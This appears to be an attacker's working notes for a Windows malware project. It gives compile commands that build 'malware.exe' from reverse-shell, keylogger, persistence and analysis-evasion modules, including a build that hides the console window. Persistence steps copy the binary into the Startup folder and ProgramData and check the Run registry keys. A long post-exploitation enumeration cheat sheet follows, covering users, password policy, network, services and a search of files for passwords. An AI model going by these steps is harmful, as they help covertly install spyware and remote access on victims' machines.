compile without keylogger g++ -Wno-deprecated-declarations -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -o malware.exe main.cpp ReverseShell.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp Authenticator.cpp Utilities.cpp -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -static

everything tested and working with 
g++ -Wno-deprecated-declarations -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -o malware.exe main.cpp ReverseShell.cpp keylogger.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp Authenticator.cpp Utilities.cpp -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -static



compile command tested to run console not in view g++ -Wno-deprecated-declarations -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -o malware.exe main.cpp ReverseShell.cpp keylogger.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -static -mwindows



ReverseShell

g++ -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -o malware.exe keylogger.cpp main.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp




g++ -Wno-deprecated-declarations -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -o malware.exe main.cpp ReverseShell.cpp keylogger.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp




persistence
check to verify it's in place
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

copy "C:\Users\johns\Downloads\malware.exe" "C:\ProgramData\malware.exe"

3. Startup Folder
Copy malware.exe to the Startup folder to execute it when the user logs in.

Command:
cmd
Copy code
copy "C:\Users\shiti\Downloads\malware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\malware.exe"


1. System Information
General System Info:

cmd
Copy code
systeminfo
Operating System Version:

cmd
Copy code
ver
Detailed OS Info:

cmd
Copy code
wmic os get Caption, Version, BuildNumber, OSArchitecture
BIOS Information:

cmd
Copy code
wmic bios get Manufacturer, Version, SerialNumber
System Boot Time:

cmd
Copy code
wmic os get LastBootUpTime
List Environment Variables:

cmd
Copy code
set
🔹 2. User and Group Enumeration
List All Users:

cmd
Copy code
net user
Detailed User Info:

cmd
Copy code
net user [username]
List All Groups:

cmd
Copy code
net localgroup
Members of Administrators Group:

cmd
Copy code
net localgroup administrators
Current Logged-in User:

cmd
Copy code
whoami
List User Privileges:

cmd
Copy code
whoami /priv
Domain Info (if domain-joined):

cmd
Copy code
net config workstation
🔹 3. Password Policies
View Local Password Policy:

cmd
Copy code
net accounts
Check Account Lockout Policy:

cmd
Copy code
net accounts
List Password Policies via secedit:

cmd
Copy code
secedit /export /cfg C:\policy.txt
type C:\policy.txt
🔹 4. Network Enumeration
IP Configuration:

cmd
Copy code
ipconfig /all
List Open Ports:

cmd
Copy code
netstat -an
List Active Connections:

cmd
Copy code
netstat -ano
ARP Table:

cmd
Copy code
arp -a
Routing Table:

cmd
Copy code
route print
Network Shares:

cmd
Copy code
net share
Mapped Drives:

cmd
Copy code
net use
DNS Cache:

cmd
Copy code
ipconfig /displaydns
Firewall Configuration:

cmd
Copy code
netsh firewall show state
🔹 5. Installed Applications and Updates
List Installed Programs:

cmd
Copy code
wmic product get Name, Version
List Installed Hotfixes/Updates:

cmd
Copy code
wmic qfe get Description, HotFixID, InstalledOn
List Startup Programs:

cmd
Copy code
wmic startup get Caption, Command
🔹 6. Services and Processes
List All Services:

cmd
Copy code
sc query state= all
List Running Processes:

cmd
Copy code
tasklist
Detailed Process Info:

cmd
Copy code
wmic process get Name, ProcessId, CommandLine
Check Scheduled Tasks:

cmd
Copy code
schtasks /query /fo LIST /v
🔹 7. File and Directory Enumeration
List Files and Directories (Recursive):

cmd
Copy code
dir /s
List Hidden Files:

cmd
Copy code
dir /a:h
Find Files Containing Keywords:

cmd
Copy code
findstr /s /i "password" *.*
Check File Permissions:

cmd
Copy code
icacls [filename]
Search for Executable Files:

cmd
Copy code
dir *.exe /s /b
🔹 8. Security Policies and Configuration
Local Security Policy Export:

cmd
Copy code
secedit /export /cfg C:\security_policy.cfg
Group Policy Results:

cmd
Copy code
gpresult /v
Audit Policy:

cmd
Copy code
auditpol /get /category:*
Registry Autoruns:

cmd
Copy code
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
🔹 9. Windows Event Logs
System Logs:

cmd
Copy code
wevtutil qe System /c:5 /f:text
Security Logs:

cmd
Copy code
wevtutil qe Security /c:5 /f:text
Application Logs:

cmd
Copy code
wevtutil qe Application /c:5 /f:text
🔹 10. Miscellaneous Commands
Disk Usage and Free Space:

cmd
Copy code
fsutil volume diskfree C:
Check System Uptime:

cmd
Copy code
net stats srv
System Drives Info:

cmd
Copy code
wmic logicaldisk get DeviceID, FileSystem, FreeSpace, Size, VolumeName
Check for Open Files:

cmd
Copy code
openfiles /query
View Running Services:

cmd
Copy code
tasklist /svc